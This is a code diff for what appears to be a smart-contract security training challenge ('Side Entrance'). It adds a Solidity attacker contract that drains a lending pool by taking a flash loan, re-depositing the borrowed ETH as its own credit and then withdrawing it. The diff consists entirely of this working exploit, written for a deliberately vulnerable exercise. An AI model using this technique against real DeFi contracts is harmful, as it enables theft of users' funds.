@@ -45,7 +45,8 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        SideEntranceAttacker attacker = new SideEntranceAttacker(pool, recovery);
+        attacker.attack();
     }
 
     /**
@@ -55,4 +56,34 @@ contract SideEntranceChallenge is Test {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
+}
+
+contract SideEntranceAttacker {
+    SideEntranceLenderPool public immutable pool;
+    address public immutable recovery;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // 1. Borrow everything; the pool calls execute() below
+        pool.flashLoan(address(pool).balance);
+
+        // 2. The loan is "repaid" and we hold a deposit credit, so withdraw it
+        pool.withdraw();
+
+        // 3. Forward the stolen ETH to the recovery account
+        (bool ok,) = recovery.call{value: address(this).balance}("");
+        require(ok, "forward failed");
+    }
+
+    // Flash loan callback: hand the borrowed ETH straight back as a deposit
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    // Needed to receive ETH from withdraw()
+    receive() external payable {}
 }
